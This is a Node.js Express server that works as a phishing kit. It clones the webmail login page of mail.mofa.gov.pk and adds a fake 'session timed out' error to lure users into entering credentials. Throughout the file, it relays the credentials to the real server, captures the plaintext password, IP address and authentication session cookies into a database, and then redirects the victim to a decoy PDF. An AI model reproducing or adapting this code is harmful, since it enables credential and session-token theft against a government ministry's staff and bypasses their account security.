const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const tough = require('tough-cookie');
const session = require('express-session');
const https = require('https');
const path = require('path');
const connectDB = require('./db');
const User = require('./models/User');

const app = express();
connectDB();

app.set('view engine', 'ejs');
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

app.use(session({
  secret: 'shduhfuishdiufhwuiriuwekhdfsdk',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false }
}));

const loginUrl = 'https://mail.mofa.gov.pk/';

const createAxiosWithJar = (cookieJar) => {
  return axios.create({
    httpsAgent: new https.Agent({ rejectUnauthorized: false }),
    withCredentials: true,
    maxRedirects: 0,
    validateStatus: status => status >= 200 && status < 400,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/101.0.4951.54 Safari/537.36'
    }
  });
};

function fixRelativePaths(html) {
  const $ = cheerio.load(html);
  $('link[rel="stylesheet"], link[rel="SHORTCUT ICON"]').each((_, el) => {
    const href = $(el).attr('href');
    if (href && !href.startsWith('http')) $(el).attr('href', loginUrl + href);
  });
  $('img').each((_, el) => {
    const src = $(el).attr('src');
    if (src && !src.startsWith('http')) $(el).attr('src', loginUrl + src);
  });
  return $;
}

async function fetchLoginPage(req) {
  try {
    const cookieJar = new tough.CookieJar();
    const client = createAxiosWithJar(cookieJar);
    const response = await client.get(loginUrl);

    (response.headers['set-cookie'] || []).forEach(raw => {
      try { cookieJar.setCookieSync(raw, loginUrl); } catch {}
    });

    const cookies = cookieJar.getCookiesSync(loginUrl);
    req.session.initialCookies = cookies.map(c => c.cookieString());

    const csrfToken = cookies.find(c => c.key === 'ZM_LOGIN_CSRF')?.value;
    req.session.zmLoginCsrf = csrfToken;

    const $ = cheerio.load(response.data);
    return $.html();
  } catch (err) {
    console.error('Error fetching login page:', err.message);
    return null;
  }
}

app.get('/', async (req, res) => {
  const html = await fetchLoginPage(req);
  if (html) {
    const $ = fixRelativePaths(html);
    const form = $('form[name="loginForm"]');

    if ($('#ZLoginErrorPanel').length === 0 && form.length) {
      const errorHtml = `
        <div id="ZLoginErrorPanel">
          <table><tbody><tr>
            <td><img src="${loginUrl}img/dwt/ImgCritical_32.png" title="Error" alt="Error" id="ZLoginErrorIcon"></td>
            <td>Your session timed out. Verify that CAPS LOCK is not on, and then retype the current username and password.</td>
          </tr></tbody></table>
        </div>`;
      form.find('table.form').first().before(errorHtml);
    }

    res.send($.html());
  } else {
    res.send('Failed to load login page.');
  }
});

app.post('/', async (req, res) => {
  const { username, password } = req.body;
  req.session.username = username;
  req.session.password = password;

  const cookieJar = new tough.CookieJar();
  const client = createAxiosWithJar(cookieJar);

  for (const cookieStr of req.session.initialCookies || []) {
    try {
      const cookie = tough.Cookie.parse(cookieStr);
      if (cookie) cookieJar.setCookieSync(cookie, loginUrl);
    } catch {}
  }

  const postData = new URLSearchParams({
    loginOp: 'login',
    login_csrf: req.session.zmLoginCsrf,
    username,
    password,
    client: 'preferred',
  }).toString();

  try {
    const response = await client.post(loginUrl, postData, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': cookieJar.getCookiesSync(loginUrl).map(c => c.cookieString()).join('; ')
      }
    });

    // Save new cookies from login response
    (response.headers['set-cookie'] || []).forEach(raw => {
      try {
        const cookie = tough.Cookie.parse(raw);
        if (!cookie) return;
        cookieJar.setCookieSync(cookie, loginUrl);

        if (cookie.key === 'ZM_AUTH_TOKEN') req.session.zmAuthToken = cookie.cookieString();
      } catch {}
    });

    req.session.loginCookies = cookieJar.getCookiesSync(loginUrl).map(c => c.cookieString());

    if (req.session.zmAuthToken) {
      // Auth success, follow up GET to grab remaining cookies
      const getResponse = await client.get(loginUrl, {
        headers: {
          'Cookie': cookieJar.getCookiesSync(loginUrl).map(c => c.cookieString()).join('; ')
        }
      });

      (getResponse.headers['set-cookie'] || []).forEach(raw => {
        try {
          const cookie = tough.Cookie.parse(raw);
          if (cookie) cookieJar.setCookieSync(cookie, loginUrl);
        } catch {}
      });

      req.session.loginCookies = cookieJar.getCookiesSync(loginUrl).map(c => c.cookieString());
      req.session.isAuthenticated = true;
     
      const newUser = new User({
        username: req.session.username,
        password: req.session.password,
        host_ip: req.ip,
        user_agent: req.headers['user-agent'],
        timestamp: new Date(),
        cookies: req.session.loginCookies
      });

      await newUser.save();
      return res.redirect('/files/file.pdf');
    }

    // Login failed: update new CSRF & cookies
    (response.headers['set-cookie'] || []).forEach(raw => {
      try {
        const cookie = tough.Cookie.parse(raw);
        if (cookie) cookieJar.setCookieSync(cookie, loginUrl);
      } catch {}
    });

    req.session.initialCookies = cookieJar.getCookiesSync(loginUrl).map(c => c.cookieString());

    const $ = fixRelativePaths(response.data);
    const newToken = $('input[name="login_csrf"]').val();
    if (newToken) req.session.zmLoginCsrf = newToken;

    $('#zLoginForm').attr('action', '/');

    const form = $('form[name="loginForm"]');
    if ($('#ZLoginErrorPanel').length === 0 && form.length) {
      const errorHtml = `
        <div id="ZLoginErrorPanel">
          <table><tbody><tr>
            <td><img src="${loginUrl}img/dwt/ImgCritical_32.png" title="Error" alt="Error" id="ZLoginErrorIcon"></td>
            <td>Invalid credentials or session expired. Try again.</td>
          </tr></tbody></table>
        </div>`;
      form.find('table.form').first().before(errorHtml);
    }

    res.send($.html());

  } catch (err) {
    console.error('Login error:', err.message);
    res.send('Login failed!');
  }
});

app.get('/files/file.pdf', (req, res) => {
  if (!req.session.isAuthenticated) {
    return res.redirect('/');
  }
  res.sendFile(path.join(__dirname, 'files', 'file.pdf'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
